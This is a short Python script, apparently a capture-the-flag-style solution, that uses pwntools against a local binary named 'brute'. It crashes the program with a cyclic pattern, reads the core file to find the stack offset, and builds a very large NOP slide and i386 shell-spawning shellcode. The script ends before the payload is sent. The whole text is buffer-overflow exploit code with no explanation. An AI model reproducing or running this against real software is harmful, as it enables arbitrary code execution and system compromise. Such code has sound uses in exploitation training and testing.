from pwn import *

p = process('./brute')
p.sendline(cyclic(20000))
p.wait()

core = p.corefile

offset = cyclic_find(core.read(core.esp,4))

slide = bytes(asm(shellcraft.i386.nop()*pow(2,30)))
payload = bytes(asm(shellcraft.i386.sh()))
